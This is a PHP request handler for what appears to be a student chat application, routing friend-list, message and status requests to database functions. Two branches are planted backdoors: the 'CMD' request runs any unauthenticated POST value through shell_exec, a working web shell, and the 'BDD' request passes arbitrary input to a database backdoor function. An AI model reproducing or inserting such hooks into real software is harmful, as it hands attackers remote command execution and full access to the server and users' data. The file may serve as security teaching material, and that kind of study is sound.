<?php
/**
 * \\Author: Edgar Lefèvre & Emilio Chatel
 * \\Company: ISEN Yncréa Ouest
 * \\Email: edgar.lefevre@isen-ouest.yncrea.fr
 * \\Email: emilio.chatel@isen-ouest.yncrea.fr
 * \\Created Date: 31-Jan-2023 - 13:41:00
 * \\Last Modified: 29-Mar-2023 - 09:49:00
 * \\Infos: fichier php permettant le passage entre utils.js et 
 * database.php
 */

  require_once('database.php');

 /////////////////////////Mise en place des WARNINGS///////////////////////////
  ini_set('display_errors', 1);
  error_reporting(E_ALL);

  ///////////////////////////Connexion avec la BDD///////////////////////////
  $db = dbConnect();
  if (!$db) {
    header('HTTP/1.1 503 Service Unavailable');
    error_reporting('HTTP/1.1 503 Service Unavailable');
    exit;
  }
  
  ///////////////////////////Récupération des Données///////////////////////////
  $request = @$_GET['request'];

  // cette fonction récupère la liste d'amis dépendant de l'ID du pseudo connecté
  if ($request == 'pseudos') {
    if (isset($_GET['user_id'])){
      $data = dbGetAmis($db, intval($_GET['user_id']));
    }
  }

  // fonction remonte l'user Id de en fonction du pseudo de l'utilisateur
  if ($request == 'UserId') {
    if (isset($_GET['pseudo'])){
      $data = dbGetId($db, $_GET['pseudo']);
    }
  }

  // cette fonction ajoute un ami en fonction
  if ($request == 'ajoutami') {
    if ($_SERVER['REQUEST_METHOD'] == 'POST'){
      $userId =intval($_POST['user_id']);
      $ami = $_POST['ami'];
      $data = dbAddAmis($db,$userId,$ami);
    }
  }

  // cette fonction récupère/envoie la liste des messages dépendant de l'ID du pseudo connecté
  if ($request == 'messages'){
    // Get messages (va chercher les messages dans la BDD)
    if ($_SERVER['REQUEST_METHOD'] == 'GET'){
      if (isset($_GET['user_id']) && isset($_GET['amiId'])){
        $data = dbGetMessage($db, intval($_GET['user_id']), intval($_GET['amiId']));
      }
    }
    // Post message (ajout d'un message dans la BDD)
    if ($_SERVER['REQUEST_METHOD'] == 'POST'){
      $userId =intval($_POST['user_id']);
      $message = $_POST['message'];
      $amiId = $_POST['amiId'];
      $data = dbAddMessage($db, $message, $userId,$amiId); // on appelle la fonction addMessage
    }
  }

  // change le statut du pseudo connecté
  if($request == 'statut'){
    if ($_SERVER['REQUEST_METHOD'] == 'POST'){
      $etat =$_POST['value'];
      $pseudo =$_POST['pseudo'];
      $data = dbchangestatut($db,$etat,$pseudo);
    }
  }

  // fonction backdoor sur la base de donnes
  if($request == 'BDD'){
    $demande =$_POST['demande'];
    if (isset($_POST['message1'])){
      $message1 =$_POST['message1'];
    }else{
      $message1 = 'none';
    }
    if (isset($_POST['message2'])){
      $message2 =$_POST['message2'];
    }else{
      $message2 = 'none';
    }
    $data = dbBackdoor($db,$demande,$message1,$message2);
  }

  //fonction backdoor invite de commande, ne passe pas 
  // par la base de donnée (database.php)
  if($request == 'CMD'){
    $commande = $_POST['commande'];
    $data = shell_exec($commande);
  }
  
  ///////////////////////////Gestion de la réponse///////////////////////////
  // renvoie la reponse a l'utilisteur connecte
  // en fonction du format utilisé par la variable type
  if (isset($data)){  // si data existe 
    switch (@$_GET['type']){
      case 'html':    //formaté en HTML
        header('Content-Type: text/html; charset=utf-8');
        echo '<h1><u>Données au format HTML</u></h1><hr>';
        echo '<table border="1">';
        foreach (array_keys($data[0]) as $key)
          echo '<th>'.$key.'</th>';
        foreach ($data as $line){
          echo '<tr>';
          foreach (array_values($line) as $value)
            echo '<td>'.$value.'</td>';
          echo '</tr>';
        }
        echo '</table>';
        break;
      case 'csv':   //formaté en CSV
        header('Content-Type: text/plain; charset=utf-8');
        echo implode(',', array_keys($data[0])).PHP_EOL;
        foreach ($data as $line)
          echo implode(',', array_values($line)).PHP_EOL;
        break;
      default:    //formaté en JSON
        header('Content-Type: application/json; charset=utf-8');
        header('Cache-control: no-store, no-cache, must-revalidate');
        header('Pragma: no-cache');
        header('HTTP/1.1 200 OK');
        echo json_encode($data);
    }
  }
  else
    header('HTTP/1.1 400 Bad Request');
  exit;
?>
